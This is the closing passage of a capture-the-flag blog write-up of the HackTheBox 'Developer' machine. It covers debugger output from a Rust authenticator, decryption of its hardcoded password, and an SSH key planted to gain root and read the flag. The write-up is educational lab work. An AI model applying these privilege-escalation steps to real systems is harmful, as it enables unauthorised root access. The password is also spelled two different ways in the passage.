<span class="gp">   0x55555555b9b2 &lt;_ZN14authentication4main17h453271f02403abafE+530&gt;</span>:   jne    0x55555555b9e9 &lt;_ZN14authentication4main17h453271f02403abafE+585&gt;
<span class="gp">   0x55555555b9b4 &lt;_ZN14authentication4main17h453271f02403abafE+532&gt;</span>:   mov    rax,QWORD PTR <span class="o">[</span>rsp+0x40]
<span class="gp">   0x55555555b9b9 &lt;_ZN14authentication4main17h453271f02403abafE+537&gt;</span>:   cmp    rax,r15
<span class="go">Guessed arguments:
</span><span class="gp">arg[0]: 0x7fffffffd9b0 --&gt;</span><span class="w"> </span>0x5555555b7be0 <span class="nt">--</span><span class="o">&gt;</span> 0x5555555b7ba0 <span class="nt">--</span><span class="o">&gt;</span> 0x9a95d2d9e3591f76 
<span class="go">arg[1]: 0x5555555b7b50 ("0xdfpassword\n")
arg[2]: 0xc ('\x0c')
</span><span class="gp">arg[3]: 0x5555555b7d20 --&gt;</span><span class="w"> </span>0x0 
<span class="go">arg[4]: 0xc ('\x0c')
[------------------------------------stack-------------------------------------]
</span><span class="gp">0000| 0x7fffffffd9b0 --&gt;</span><span class="w"> </span>0x5555555b7be0 <span class="nt">--</span><span class="o">&gt;</span> 0x5555555b7ba0 <span class="nt">--</span><span class="o">&gt;</span> 0x9a95d2d9e3591f76 
<span class="gp">0008| 0x7fffffffd9b8 --&gt;</span><span class="w"> </span>0x5555555b0ae8 <span class="nt">--</span><span class="o">&gt;</span> 0x55555555c6a0 <span class="o">(</span>&lt;_ZN4core3ptr13drop_in_place17h268f9816975da054E&gt;:  push   rbx<span class="o">)</span>
<span class="gp">0016| 0x7fffffffd9c0 --&gt;</span><span class="w"> </span>0x5555555b4208 <span class="nt">--</span><span class="o">&gt;</span> 0x5555555b5a10 <span class="nt">--</span><span class="o">&gt;</span> 0x0 
<span class="gp">0024| 0x7fffffffd9c8 --&gt;</span><span class="w"> </span>0x0 
<span class="gp">0032| 0x7fffffffd9d0 --&gt;</span><span class="w"> </span>0x0 
<span class="gp">0040| 0x7fffffffd9d8 --&gt;</span><span class="w"> </span>0x0 
<span class="gp">0048| 0x7fffffffd9e0 --&gt;</span><span class="w"> </span>0x0 
<span class="gp">0056| 0x7fffffffd9e8 --&gt;</span><span class="w"> </span>0x0 
<span class="go">[------------------------------------------------------------------------------]
Legend: code, data, rodata, value

Breakpoint 3, 0x000055555555b9a6 in authentication::main ()
</span></code></pre></div></div>

<p><code class="language-plaintext highlighter-rouge">arg[1]</code> is the input I passed in, and <code class="language-plaintext highlighter-rouge">arg[3]</code> will hold the result. In CTR mode, the output length will be the same as the input length.</p>

<p>To check this decryption theory, I’ll use <a href="https://gchq.github.io/CyberChef">CyberChef</a>. It works:</p>

<picture>
    <source type="image/webp" srcset="/img/image-20210716095644871.webp">
    <img src="/img/image-20210716095644871.png" alt="image-20210716095644871" class="include_image ">
</picture>

<p>The password is “RustForSecurity@Developer2021:)”.</p>

<h3 id="ssh-1">SSH</h3>

<p>With the password, I’ll run the program with <code class="language-plaintext highlighter-rouge">sudo</code>, and it asks for my public key:</p>

<div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">karl@developer:~$</span><span class="w"> </span><span class="nb">sudo</span> /root/.auth/authenticator 
<span class="go">Welcome to TheCyberGeek's super secure login portal!
Enter your password to access the super user: 
RustForSecurity@Developer@2021:)
You have successfully authenticated
Enter your SSH public key in now:
ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIDIK/xSi58QvP1UqH+nBwpD1WQ7IaxiVdTpsg5U19G3d nobody@nothing
You may now authenticate as root!
</span></code></pre></div></div>

<p>On entering it, the program says I’m authenticated. And my key works:</p>

<div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">oxdf@parrot$</span><span class="w"> </span>ssh <span class="nt">-i</span> ~/keys/ed25519_gen root@10.10.11.103
<span class="go">...[snip]...
root@developer:~# 
</span></code></pre></div></div>

<p>And I can grab the flag:</p>

<div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">root@developer:~#</span><span class="w"> </span><span class="nb">cat </span>root.txt
<span class="go">999061a9************************
</span></code></pre></div></div>


      </div>
    </div>
    
  </div><a class="u-url" href="/2022/01/15/htb-developer.html" hidden=""></a>
</article>

      </div>
    </main>
